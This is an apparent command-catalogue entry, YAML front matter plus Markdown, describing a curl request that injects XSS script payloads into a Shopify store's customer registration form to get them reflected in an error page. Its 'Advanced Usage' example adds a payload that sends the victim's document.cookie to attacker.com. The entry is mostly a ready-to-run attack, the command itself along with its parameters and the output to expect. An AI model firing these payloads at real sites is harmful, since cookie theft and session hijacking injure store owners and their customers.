---
id: cmd-uuid-1
data: >-
  curl -X POST 'https://example.myshopify.com/account/register' -d
  'forms_key=...' -d 'contact[email]=test@example.com' -d
  'customer[first_name]=<script>alert("XSS")</script>' -d
  'customer[last_name]=<script>alert("XSS")</script>' -d
  'customer[password]=pass' -d 'commit=Create account'
tags:
  - http
  - post
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.208Z'
verified: false
validated: true
submitted: true
---
# curl-shopify-registration-post

## Command

```bash
curl -X POST 'https://example.myshopify.com/account/register' \
  -d 'forms_key=...' \
  -d 'contact[email]=test@example.com' \
  -d 'customer[first_name]=<script>alert("XSS")</script>' \
  -d 'customer[last_name]=<script>alert("XSS")</script>' \
  -d 'customer[password]=pass' \
  -d 'commit=Create account'
```

## Description

This command submits a malicious POST request to the Shopify customer registration endpoint, injecting XSS payloads into name fields and using a short password to trigger an error response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://.../account/register'` | Target URL | Yes |
| `-d 'key=value'` | Form data pairs, including payloads | Yes |
| `customer[password]=pass` | Short password to force error | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.myshopify.com/account/register' -d 'customer[first_name]=<script>alert(1)</script>' -d 'customer[password]=a'
```

### Advanced Usage

```bash
curl -X POST 'https://target.myshopify.com/account/register' -d 'contact[email]=victim@test.com' -d 'customer[first_name]=<script>document.location='http://attacker.com/?c='+document.cookie</script>' -d 'customer[last_name]=Victim' -d 'customer[password]=short' -d 'commit=Create'
```

## Expected Output

HTTP 200 response with HTML error page containing reflected, unescaped payload, e.g., lines showing <script>alert('XSS')</script> in the body.

## Related

- [[Related Procedure: Submit-Malicious-Registration-Payload]]
